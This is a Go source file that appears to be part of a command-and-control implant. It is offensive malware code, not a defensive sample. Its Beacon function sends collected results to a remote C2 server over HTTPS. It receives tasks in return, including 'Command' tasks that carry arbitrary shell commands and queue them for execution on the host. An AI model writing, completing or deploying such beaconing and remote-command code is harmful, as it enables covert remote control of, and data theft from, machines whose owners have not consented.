package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type HTTPSC2TaskRequest struct {
	ID       uint                   `json:"id"`
	TaskType string                 `json:"type"`
	Options  map[string]interface{} `json:"options"`
}

type HTTPSC2Communicator struct {
	// Endpoints? #TODO
	// URI? #TODO
	Client *http.Client
}

func NewHTTPSC2Communicator() *HTTPSC2Communicator {
	return &HTTPSC2Communicator{
		Client: &http.Client{
			Timeout: time.Second * 10,
		},
	}
}

// Beacon sends results and returns the next TaskQueue
func (h *HTTPSC2Communicator) Beacon(results []Result) (*TaskQueue, error) {
	// 1. Marshal results
	body, err := json.Marshal(results)
	if err != nil {
		return nil, fmt.Errorf("marshal results: %w", err)
	}

	// 2. Build request
	req, err := http.NewRequest(http.MethodPost, C2HTTPSURI+C2HTTPSBEACONENDPOINT, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// 3. Do request
	resp, err := h.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("POST beacon: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status: %s", resp.Status)
	}

	var c2Tasks []HTTPSC2TaskRequest
	if err = json.NewDecoder(resp.Body).Decode(&c2Tasks); err != nil {
		return nil, fmt.Errorf("decode tasks: %w", err)
	}

	// 5. Enqueue tasks
	tq := NewTaskQueue()
	for _, t := range c2Tasks {
		switch t.TaskType {
		case "Ping":
			tq.Enqueue(NewPingTask(t.ID))
		case "Command":
			// TODO: CHECKOVER
			raw, ok := t.Options["commandWithArgs"]
			if !ok {
				// TODO: should add malformed Task as a result
				// skip malformed task, but log it
				continue
			}
			args, ok := raw.([]interface{})
			if !ok {
				continue
			}
			// convert []interface{} → []string
			cmd := make([]string, len(args))
			for i, v := range args {
				if s, ok := v.(string); ok {
					cmd[i] = s
				}
			}
			tq.Enqueue(NewShellCommandTask(t.ID, cmd))

		}
	}
	return tq, nil
}
